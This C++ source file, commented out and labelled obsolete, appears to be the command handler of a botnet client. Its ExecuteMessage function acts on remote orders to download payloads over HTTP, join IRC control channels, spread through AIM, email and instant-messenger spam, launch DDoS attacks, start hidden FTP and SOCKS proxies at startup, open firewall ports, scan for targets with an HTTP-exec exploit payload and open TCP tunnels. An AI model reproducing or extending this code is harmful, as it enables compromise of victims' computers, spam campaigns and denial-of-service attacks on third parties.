//obsolete
/*#include <winsock2.h>
#include "executemessage.h"
#include "payload_httpexec.h"

AimSpread* pAimSpread = NULL;
#ifndef NO_EMAIL_SPREAD
EmailSpread* pEmailSpread = NULL;
#endif
DDoS* pDDoS = NULL;
ScanThread* pScanThread = NULL;

VOID ExecuteMessage(PCHAR Message){
	CHAR MessageCopy[MAX_MSG_LENGTH];
	strncpy(MessageCopy, Message, sizeof(MessageCopy));
	PCHAR Item[8];
	UINT Ordinal = TokenizeStr(MessageCopy, Item, 8, ",");
	if(Ordinal == MSG_SENDLOG){
		if(Item[3]){
			new TransferLog(atoi(Item[1]), Item[2], atoi(Item[3]));
		}
	}else
	if(Ordinal == MSG_HTTP_DOWNLOAD){
		if(Item[2]){
			new class HTTP::Download(Item[1], Item[2], Item[3] ? atoi(Item[3]) : 0);
		}
	}else
	if(Ordinal == MSG_START_IRCBOT){
		if(Item[7]){
			IRCList.Add(new IRC(Item[1], atoi(Item[2]), Item[3], Item[4], Item[5], strcmp(Item[6], "UUID") == 0 ? Config::GetUUIDAscii() : Item[6], Item[7]));
		}
	}else
	if(Ordinal == MSG_SPREAD_AIM){
		UINT Times = 0;
		if(Item[1]){
			Times = atoi(Item[1]);
			if(!pAimSpread){
				pAimSpread = new AimSpread(Times);
			}else{
				pAimSpread->SetTimesToSend(Times);
				pAimSpread->Reset();
			}
		}
	}else
#ifndef NO_EMAIL_SPREAD
	if(Ordinal == MSG_SPREAD_EMAIL){
		UINT Times = 0;
		if(Item[1])
			Times = atoi(Item[1]);
		if(!pEmailSpread)
			pEmailSpread = new EmailSpread(Times);
		else{
			pEmailSpread->SetTimesToSend(Times);
			pEmailSpread->Reset();
		}
	}else
#endif
	if(Ordinal == MSG_DDOS){
		if(Item[1]){
			if(!pDDoS)
				pDDoS = new DDoS();
			if(atoi(Item[1]) == 1)
				pDDoS->ClearVictimList();
			if(Item[7])
				pDDoS->AddVictim(Item[2], atoi(Item[3]), atoi(Item[4]), atoi(Item[5]), atoi(Item[6]), atoi(Item[7]));
		}
	}else
	if(Ordinal == MSG_START_FTP){
		BOOL Autostart = FALSE;
		PCHAR User = NULL;
		PCHAR Pass = NULL;
		USHORT Port;
		UCHAR UserHash[16];
		UCHAR PassHash[16];
		if(Item[3]){
			Port = atoi(Item[1]);
			User = Item[2];
			Pass = Item[3];

			MD5 MD5User;
			MD5User.Update((PUCHAR)User, strlen(User));
			MD5User.Finalize(UserHash);
			MD5 MD5Pass;
			MD5Pass.Update((PUCHAR)Pass, strlen(Pass));
			MD5Pass.Finalize(PassHash);

			if(Item[4])
				Autostart = TRUE;
			if(Autostart)
				Config::EnableFTPStartup(Port, UserHash, PassHash);
			new FTPServer(Port, UserHash, PassHash);
		}
	}else
	if(Ordinal == MSG_START_SOCKS){
		CHAR SocksVersion = NULL;
		USHORT SocksPort = 0;
		BOOL Autostart = FALSE;
		UCHAR SocksUserHash[16];
		UCHAR SocksPassHash[16];
		if(Item[1]){
			if(strstr(Item[1], "4"))
				SocksVersion |= ALLOW_SOCKS_VER_4;
			if(strstr(Item[1], "5"))
				SocksVersion |= ALLOW_SOCKS_VER_5;
		}
		if(Item[2]){
			SocksPort = atoi(Item[2]);
			if(SocksVersion == ALLOW_SOCKS_VER_4){
				if(Item[3])
					Autostart = TRUE;
				if(Autostart)
					Config::EnableSocksStartup(SocksVersion, SocksPort, SocksUserHash, SocksPassHash);
				new ProxyServer(SocksVersion, SocksPort, SocksUserHash, SocksPassHash);
			}
		}
		if(Item[3]){
			if(SocksVersion & ALLOW_SOCKS_VER_5){
				PCHAR SocksUser = strtok(Item[3], ":");
				PCHAR SocksPass;
				if(SocksUser)
					SocksPass = strtok(NULL, ":");
				if(SocksPass){
					MD5 MD5User;
					MD5User.Update((PUCHAR)SocksUser, strlen(SocksUser));
					MD5User.Finalize(SocksUserHash);
					MD5 MD5Pass;
					MD5Pass.Update((PUCHAR)SocksPass, strlen(SocksPass));
					MD5Pass.Finalize(SocksPassHash);
				}
			}else
				Autostart = TRUE;
			if(Item[4])
				Autostart = TRUE;
			if(Autostart)
				Config::EnableSocksStartup(SocksVersion, SocksPort, SocksUserHash, SocksPassHash);
			new ProxyServer(SocksVersion, SocksPort, SocksUserHash, SocksPassHash);
		}
	}else
	if(Ordinal == MSG_FIREWALL_OPEN_PORT){
		if(Item[1]){
			FireWall FireWall;
			FireWall.OpenPort(atoi(Item[1]), Item[2] ? NET_FW_IP_PROTOCOL_UDP : NET_FW_IP_PROTOCOL_TCP, L"null");
		}
	}else
	if(Ordinal == MSG_SEND_IM){
		if(Item[4]){
			DWORD Program = atoi(Item[1]);
			if(Program & 1)
				AIM::SendIM(Item[2], Item[3], atoi(Item[4]));
			if(Program & 2)
				MSM::SendIM(Item[2], Item[3], atoi(Item[4]));
			if(Program & 4)
				Yahoo::SendIM(Item[2], Item[3], atoi(Item[4]));
			if(Program & 8)
				Triton::SendIM(Item[2], Item[3], atoi(Item[4]));
		}
	}else
	if(Ordinal == MSG_SPAM_IM){
		if(Item[3]){
			DWORD Program = atoi(Item[1]);
			if(Program & 1)
				AIM::SpamBuddyList(Item[2], atoi(Item[3]));
			if(Program & 2)
				MSM::SpamContacts(Item[2], atoi(Item[3]));
			if(Program & 4)
				Yahoo::SpamContacts(Item[2], atoi(Item[3]));
			if(Program & 8)
				Triton::SpamBuddyList(Item[2], atoi(Item[3]));
		}
	}else
	if(Ordinal == MSG_HTTP_VISIT){
		if(Item[1]){
			new HTTP::Visit(Item[1], (BOOL)Item[2]);
		}
	}else
	if(Ordinal == MSG_HTTP_SPEEDTEST){
		if(Item[1]){
			new HTTP::SpeedTest(Item[1]);
		}
	}else
	if(Ordinal == MSG_SCAN){
		if(Item[1]){
			if(stricmp(Item[1], "PAYLOAD") == 0){
				if(Item[2]){
					if(stricmp(Item[2], "HTTPEXEC") == 0){
						if(Item[3])
							Exploits.SetPayload(new PayloadHTTPExec(Item[3]));
					}else
					if(stricmp(Item[2], "NONE") == 0){
						Exploits.SetPayload(NULL);
					}
				}
			}else
			if(stricmp(Item[1], "TARGET") == 0){
				if(Item[2]){
					if(stricmp(Item[2], "ADD") == 0){
						if(!pScanThread){
							pScanThread = new ScanThread(0);
							pScanThread->Pause();
						}
						if(Item[3])
							pScanThread->AddTarget(Item[3]);
					}else
					if(stricmp(Item[2], "CLEAR") == 0){
						if(pScanThread){
							pScanThread->ClearTargets();
						}
					}else
					if(stricmp(Item[2], "CURRENT") == 0){
						if(pScanThread){
							CHAR Text[64];
							sprintf(Text, "%s:%d", inet_ntoa(SocketFunction::Stoin(pScanThread->GetCurrentAddr())), pScanThread->GetCurrentPort());
							IRCList.Notify(Text);
						}
					}
				}
			}else
			if(stricmp(Item[1], "EXPLOIT") == 0){
				if(Item[2]){
					if(stricmp(Item[2], "NONE") == 0){
						Exploits.SetExploit(NULL);
					}else{
						Exploits.SetExploit(Item[2]);
					}
				}
			}else
			if(stricmp(Item[1], "START") == 0){
				if(Item[2]){
					if(!pScanThread)
						pScanThread = new ScanThread(atoi(Item[2]));
					pScanThread->SetInterval(atoi(Item[2]));
					pScanThread->Resume();
				}
			}else
			if(stricmp(Item[1], "STOP") == 0){
				if(pScanThread)
					pScanThread->Pause();
			}
		}
	}else
	if(Ordinal == MSG_TCPTUNNEL){
		if(Item[3]){
			new TCPTunnel(atoi(Item[1]), atoi(Item[2]), Item[3]);
		}
	}
}*/